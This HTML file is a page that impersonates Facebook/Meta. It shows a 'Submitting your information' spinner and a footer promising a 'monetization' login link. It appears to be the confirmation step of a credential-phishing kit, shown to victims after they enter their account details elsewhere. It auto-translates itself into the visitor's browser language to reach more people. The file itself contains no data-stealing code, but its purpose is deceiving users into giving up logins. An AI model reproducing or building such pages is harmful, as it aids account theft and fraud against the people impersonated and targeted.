<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title><span class="notranslate">Facebook</span> - Submitting</title>
  <link rel="stylesheet" href="style.css">
  <style>
    .spinner {
      margin: 20px auto;
      width: 60px;
      height: 60px;
      border: 6px solid #ddd;
      border-top: 6px solid #1877f2;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {0%{transform:rotate(0deg);}100%{transform:rotate(360deg);} }
    .loading-text {margin-top:15px;font-size:16px;color:#555;animation:pulse 2s infinite;}
    @keyframes pulse {0%{opacity:1;}50%{opacity:0.4;}100%{opacity:1;}}
  </style>
</head>
<body>
  <div class="container">
    <div class="logo"><div class="logo-circle"><span class="notranslate">F</span></div></div>
    <div class="spinner"></div>
    <p class="loading-text">Submitting your information... please wait</p>
  </div>
  <footer>
    <p><span class="notranslate">Facebook</span> © 2025 – This is <span class="notranslate">Facebook</span> / ∞Meta. Use this <span class="notranslate">Facebook</span> monetization link to log into your account and start the monetization process.</p>
  </footer>

  <!-- Google Translate -->
  <div id="google_translate_element" style="display:none;"></div>
  <script type="text/javascript">
    function googleTranslateElementInit() {
      new google.translate.TranslateElement(
        {
          pageLanguage: 'en',
          includedLanguages: 'es,fr,de,it,pt,zh-CN,ja',
          autoDisplay: false
        },
        'google_translate_element'
      );

      var userLang = navigator.language || navigator.userLanguage;
      userLang = userLang.split('-')[0];
      var supported = ["es","fr","de","it","pt","zh-CN","ja"];
      if (supported.includes(userLang)) {
        setTimeout(function(){
          var select = document.querySelector("select.goog-te-combo");
          if (select) {
            select.value = userLang;
            select.dispatchEvent(new Event("change"));
          }
        }, 1000);
      }
    }
  </script>
  <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
</body>
</html>
